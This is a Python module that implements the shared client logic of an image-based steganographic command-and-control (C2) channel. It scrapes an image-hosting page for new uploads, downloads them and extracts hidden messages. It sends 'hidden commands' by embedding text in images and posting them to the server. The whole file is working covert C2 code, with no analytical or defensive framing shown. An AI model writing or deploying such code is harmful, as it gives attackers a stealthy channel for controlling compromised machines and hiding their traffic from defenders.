import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from stegano import stegano
import os
from pathlib import Path


DEBUG_LEVEL = 0


class ImageC2_Common:
    def __init__(self, imagec2_url:str, image_folder:Path, base_file_name:str):
        self.url = imagec2_url
        self.known_image_urls = []
        self.image_folder:Path = image_folder
        self.stego = stegano(self.image_folder)
        self.base_file_name = base_file_name
        self.images_uploaded = 0

    
    def update_existing_urls(self):
        # Populate the known image URLs
        for filename in os.listdir(self.image_folder):
            if filename not in self.known_image_urls:
                self.known_image_urls.append(filename)


    def get_images_from_webpage(self):
        try:
            # Send a GET request to the URL
            response = requests.get(self.url)
            response.raise_for_status()  # Raise an HTTPError for bad responses
            # Parse the content of the request with BeautifulSoup
            soup = BeautifulSoup(response.content, 'html.parser')
            # Find all image tags
            img_tags = soup.find_all('img')
            # Extract the source URLs of the images
            img_urls = [urljoin(self.url, img['src']) for img in img_tags if 'src' in img.attrs]
            return img_urls
        except requests.exceptions.RequestException as e:
            print(f"Error fetching the webpage: {e}")
            return []
        

    def upload_image(self, file_path):
        response = None
        if None == file_path or not os.path.exists(file_path):
            print(f"File not found to upload: {file_path}")
            return None
        with open(file_path, 'rb') as file:
            files = {'file': file}
            response = requests.post(self.url, files=files)
        self.update_existing_urls()
        return response


    def download_image(self, file_path, image_url:str):
        try:
            # Send a GET request to the URL
            response = requests.get(image_url, stream=True)
            response.raise_for_status()  # Raise an HTTPError for bad responses
            # # Write the image content to a file
            with open(file_path, 'wb') as file:
                for chunk in response.iter_content(1024):
                    file.write(chunk)
        except requests.exceptions.RequestException as e:
            print(f"Error downloading the image: {e}")


    def get_new_images(self)->list[str]:
        all_image_urls = self.get_images_from_webpage()
        if all_image_urls is not None:
            new_images = [url.split('/')[-1] for url in all_image_urls if url.split('/')[-1] not in self.known_image_urls]
            for image in new_images:
                if image not in self.known_image_urls:
                    self.known_image_urls.append(image)
        if len(new_images) > 0:
            if 1 == DEBUG_LEVEL:
                print(f"New images:\n { new_images }")
            return new_images
        else:
            if 1 == DEBUG_LEVEL:
                print(f"No new images found. Current images: \n{self.known_image_urls}")
            return []
        

    def get_new_messages(self)->list[str]:
        new_messages = []
        new_images = self.get_new_images()
        for filename in new_images:
            if self.base_file_name in filename:
                continue  # Ignore images from our side.
            file_path = self.image_folder / filename
            image_url = self.url + "/static/uploads/" + filename
            self.download_image(file_path, image_url)
            message = self.stego.unhide_message(file_path)
            if message is not None:
                # print(f"Found message: {message}")
                new_messages.append(message)
            else:
                print(f"No message found in {file_path}")   
        return new_messages
    

    def check_for_hidden_message(self, file_path):
        if 1 == DEBUG_LEVEL:
            print(f"Checking for hidden message in {file_path}")
        # Decode the hidden message
        message = self.stego.unhide_message(file_path)
        if 1 == DEBUG_LEVEL:
            print(f"Hidden message: {message}")


    def send_hidden_command(self, message:str, file_path:str)->bool:
        hidden_file_path = self.stego.hide_message(message, file_path)
        if None == hidden_file_path:
            print("Error hiding message.")
            return False
        self.upload_image(hidden_file_path)
        return True
    